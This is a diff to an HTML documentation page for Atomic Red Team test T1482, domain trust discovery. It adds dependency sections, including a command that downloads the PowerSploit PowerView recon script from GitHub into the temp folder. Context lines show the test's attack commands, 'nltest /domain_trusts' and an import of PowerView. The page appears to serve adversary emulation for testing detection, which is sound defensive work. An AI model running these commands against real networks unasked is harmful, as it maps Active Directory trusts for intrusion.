@@ -416,6 +416,34 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-none">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         None
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-nltest-exe-from-rsat-must-be-present-on-disk">
+         Description: nltest.exe from RSAT must be present on disk
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#id1">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -432,6 +460,49 @@
      Atomic Test #3 - Powershell enumerate domains and forests
     </a>
     <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-powerview-powershell-script-must-exist-on-disk">
+         Description: PowerView PowerShell script must exist on disk
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id2">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id3">
+         Get Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-rsat-powershell-ad-admin-cmdlets-must-be-installed">
+         Description: RSAT PowerShell AD admin cmdlets must be installed
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id4">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id5">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
      <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
        Attack Commands: Run with
@@ -499,6 +570,33 @@ Requires the installation of dsquery via Windows RSAT or the Windows Server AD D
 Requires the installation of nltest via Windows RSAT or the Windows Server AD DS role.
 This technique has been used by the Trickbot malware family.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="dependencies-run-with-none">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">None</span></code>!<a class="headerlink" href="#dependencies-run-with-none" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-nltest-exe-from-rsat-must-be-present-on-disk">
+<h5>Description: nltest.exe from RSAT must be present on disk<a class="headerlink" href="#description-nltest-exe-from-rsat-must-be-present-on-disk" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>WHERE nltest.exe &gt;NUL 2&gt;&amp;1
+
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>echo Sorry RSAT must be installed manually
+
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1482</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">2</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>nltest /domain_trusts
@@ -518,6 +616,46 @@ This technique has been used by the Trickbot malware family.</p>
 <p>Use powershell to enumerate AD information.
 Requires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-powerview-powershell-script-must-exist-on-disk">
+<h5>Description: PowerView PowerShell script must exist on disk<a class="headerlink" href="#description-powerview-powershell-script-must-exist-on-disk" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id2">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id3">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;$env:TEMP\PowerView.ps1&quot;</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="description-rsat-powershell-ad-admin-cmdlets-must-be-installed">
+<h5>Description: RSAT PowerShell AD admin cmdlets must be installed<a class="headerlink" href="#description-rsat-powershell-ad-admin-cmdlets-must-be-installed" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id4">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">((</span><span class="nb">Get-Command</span> <span class="s2">&quot;Get-ADDomain&quot;</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span><span class="p">)</span> <span class="o">-And</span> <span class="p">(</span><span class="nb">Get-Command</span> <span class="s2">&quot;Get-ADGroupMember&quot;</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span><span class="p">))</span> <span class="p">{</span> <span class="n">exit</span> <span class="n">0</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="n">exit</span> <span class="n">1</span> <span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id5">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Write-Host</span> <span class="s2">&quot;Sorry RSAT must be installed manually&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1482</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Import-Module</span> <span class="s2">&quot;$env:TEMP\PowerView.ps1&quot;</span>
